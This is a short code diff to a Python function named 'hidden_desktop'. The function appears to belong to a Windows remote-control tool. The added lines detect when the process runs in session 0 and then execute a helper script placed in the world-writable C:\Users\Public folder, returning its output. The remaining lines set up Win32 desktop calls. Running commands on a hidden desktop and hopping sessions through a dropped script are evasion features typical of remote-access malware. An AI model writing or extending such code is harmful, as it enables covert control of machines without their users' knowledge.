@@ -1,7 +1,16 @@
 def hidden_desktop(command):
-    import sys
+    import sys, os
     if sys.platform != 'win32':
         return 'hidden desktop requires windows'
+    if os.environ.get('SP_HD_HOST') != '1':
+        import ctypes
+        from ctypes import wintypes
+        k32 = ctypes.windll.kernel32
+        sid = wintypes.DWORD()
+        k32.ProcessIdToSessionId(k32.GetCurrentProcessId(), ctypes.byref(sid))
+        if sid.value == 0 and os.path.exists(r'C:\Users\Public\hd_hop.py'):
+            import subprocess
+            return subprocess.check_output([sys.executable, r'C:\Users\Public\hd_hop.py'], text=True, timeout=30).strip()
     import ctypes
     from ctypes import wintypes
     u32 = ctypes.windll.user32
